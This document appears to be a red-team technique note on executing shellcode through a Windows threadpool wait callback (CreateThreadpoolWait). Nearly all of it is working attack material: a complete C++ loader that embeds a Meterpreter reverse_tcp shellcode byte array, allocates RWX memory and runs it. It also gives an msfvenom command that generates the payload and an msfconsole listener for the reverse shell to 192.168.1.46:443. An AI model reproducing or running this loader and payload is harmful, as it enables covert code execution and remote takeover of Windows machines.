# Threadpoolwait

### Techniques

* CreateEvent is used to create an event object with a Signaled state
* RWX memory for the shellcode is allocated with VirtualAlloc and the shellcode is written there
* CreateThreadpoolWait is used to create a wait object. 1st argument of the function is a callback function, that will be called once the wait ends (immediately in our case, since our waitable event is in the Signaled state from the start). We will pass the address of our shellcode (allocated in step 2) as the callback function
* SetThreadpoolWait is used to set wait object to the wait object created in step 3
* WaitForSingleObject is used to wait for the waitable object to become Signaled, but since our event (waitable) object was created with a Signaled state in step 1, our callback function specified in step 3 is called and the shellcode is executed right away

#### Threadpool.cpp

```cpp
#include <windows.h>
#include <threadpoolapiset.h>

unsigned char shellcode[] =
"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
"\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78"
"\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x8b\x58\x20\x50\x01\xd3"
"\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac"
"\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24"
"\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59"
"\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d"
"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x01\x2e\x68\x02"
"\x00\x01\xbb\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
"\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83"
"\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a"
"\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57"
"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68"
"\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";



int main()
{
//CreateEvent is used to create an event object with a Signaled state
HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);
//we allocate memory in the local process for our payload:
LPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
//Copies the contents of a source memory block to a destination memory block
RtlMoveMemory(shellcodeAddress, shellcode, sizeof(shellcode));
//CreateThreadpoolWait is used to create a wait object. 
//1st argument of the function is a callback function, 
// that will be called once the wait ends 
//(immediately in our case, since our waitable event is in the Signaled state from the start).
// We will pass the address of our shellcode (allocated in step 2) as the callback function
PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcodeAddress, NULL, NULL);
SetThreadpoolWait(threadPoolWait, event, NULL);
WaitForSingleObject(event, INFINITE);

return 0;
}
```

### Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.46 LPORT=443  -f c 
```

### Listener

```bash
 msfconsole -x "use exploits/multi/handler; set lhost 192.168.1.46; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
```

Tips : run on x86 
